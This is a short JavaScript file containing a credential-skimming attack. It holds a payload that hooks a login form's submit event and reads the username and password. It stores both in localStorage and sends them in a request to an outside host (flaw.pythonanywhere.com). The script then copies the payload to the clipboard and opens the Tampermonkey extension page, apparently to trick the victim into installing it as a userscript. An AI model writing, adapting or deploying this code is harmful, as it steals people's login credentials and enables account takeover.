var payload = `

document.querySelector('form#login-form').addEventListener('submit',(e)=>{
    let pw = document.querySelector('#LoginForm_password').value
    let un = document.querySelector('#LoginForm_username').value
    localStorage.u= un
    localStorage.p= pw
    fetch('https://flaw.pythonanywhere.com/save/'+un+'/'+pw)

})

`

window.focus()
navigator.clipboard.writeText(payload);

setTimeout(()=>{
	// window.close()
	let a = document.createElement("a")
	a.href = "https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=en-US"
	// a.target = "blank"
	a.innerHTML = "testu"
	document.body.appendChild(a)
	a.click()
}, 1000)